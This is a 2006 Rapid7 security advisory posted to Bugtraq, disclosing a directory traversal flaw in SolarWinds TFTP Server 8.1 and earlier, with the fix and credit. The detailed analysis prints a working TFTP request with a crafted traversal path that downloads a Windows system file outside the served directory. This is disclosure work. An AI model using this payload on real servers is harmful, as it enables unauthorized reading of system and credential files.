
Date: Fri, 21 Apr 2006 12:10:35 -0700
From: advisory@...id7.com
To: bugtraq@...urityfocus.com
Subject: Rapid7 Advisory R7-0019: Directory traversal vulnerability in SolarWinds
 TFTP Server for Windows


_______________________________________________________________________
                     Rapid7, LLC Security Advisory
_______________________________________________________________________

Rapid7 Advisory R7-0019
Directory traversal vulnerability in SolarWinds TFTP Server for Windows

   Date:  April 21, 2006
   Revision:   1.0
   http://www.rapid7.com/advisories/R7-0019.html

   CVE: CVE-2006-1951

1. Affected system(s):

   KNOWN VULNERABLE:
    o SolarWinds TFTP Server v8.1 and earlier

   KNOWN FIXED:
    o SolarWinds TFTP Server v8.2

2. Summary

   Rapid7 has found a directory traversal vulnerability in SolarWinds
   TFTP Server for Windows.  This vulnerability allows remote users to
   download any files outside of the server's TFTP data directory.

3. Vendor status and information

   SolarWinds
   http://www.solarwinds.net/Tools/Free_tools/TFTP_Server/

   Vendor was notified of this vulnerability.  The vulnerability
   is not present in the newest version of TFTP Server version 8.2,
   released in September 2005.

4. Solution

   Upgrade to TFTP Server version 8.2 or later.

5. Detailed analysis

   TFTP servers are often used to transfer configuration files and
   operating system images to routers.  TFTP is also used for devices
   that support PXE booting.

   Most implementations do trivial filtering on requested filenames
   such as "../filename" to prevent easy directory traversal.
   However, it is easy to bypass this filtering by manipulating the
   filename being requested.

   With the SolarWinds TFTP server, any file on the system can be
   downloaded using a request similar to the following:

      $ tftp 192.168.0.1
      tftp> get NUL/....//....//WINNT/win.ini
      Received 582 bytes in 0.0 seconds
      tftp> quit

      $ cat win.ini
      ; for 16-bit app support
      [fonts]
      [extensions]
      [mci extensions]
      [files]
      [Mail]
      MAPI=1
      ...

6. Credit

   This vulnerability was discovered by Chad Loder of Rapid7.

7. Contact Information

   Rapid7, LLC
   Email:   advisory@...id7.com
   Web:     http://www.rapid7.com/
   Phone:   +1 (617) 247-1717

8. Disclaimer and Copyright

   Rapid7, LLC. is not responsible for the misuse of the information
   provided in our security advisories. These advisories are a service
   to the professional security community.  There are NO WARRANTIES
   with regard to this information. Any application or distribution of
   this information constitutes acceptance AS IS, at the user's own
   risk.  This information is subject to change without notice.

   This advisory Copyright (C) 2006 Rapid7, LLC.  Permission is
   hereby granted to redistribute this advisory, providing that no
   changes are made and that the copyright notices and disclaimers
   remain intact.



